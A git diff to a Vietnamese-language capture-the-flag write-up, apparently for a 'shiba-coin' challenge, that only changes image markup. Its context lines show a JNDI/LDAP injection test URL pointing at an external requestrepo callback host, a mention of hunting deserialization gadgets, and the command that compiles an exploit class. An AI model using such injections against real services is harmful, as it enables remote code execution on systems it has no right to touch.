@@ -94,7 +94,11 @@ router.get('/get-transaction', ensureAuthenticated, async (req, res) => {
 
 ```
 Test thử với `requestrepo` : `http://localhost:3000/dashboard/get-transaction?hash=ldap://qaixu8zf.requestrepo.com` ta thấy có DNS
-[image](/images/shiba-coin_02.png)
+
+<picture>
+  <img src="https://dungnhvhust.github.io/images/shiba-coin_02.png" data-src-ignore>
+</picture>
+
 
 Giờ việc cần làm là tìm gadget để khai thác.
 Kiểm tra file `pom.xml` ta chỉ thấy có 3 dependency được dùng là :
@@ -230,7 +234,10 @@ public class Exp implements Runnable {
 }
 ```
 Compile file và chạy:
-[image](/images/shiba-coin_03.png)
+
+<picture>
+  <img src="https://dungnhvhust.github.io/images/shiba-coin_03.png" data-src-ignore>
+</picture>
 
 ```
 javac -cp ".;unboundid-ldapsdk-7.0.1.jar;commons-scxml2-2.0-SNAPSHOT.jar" Exp.java
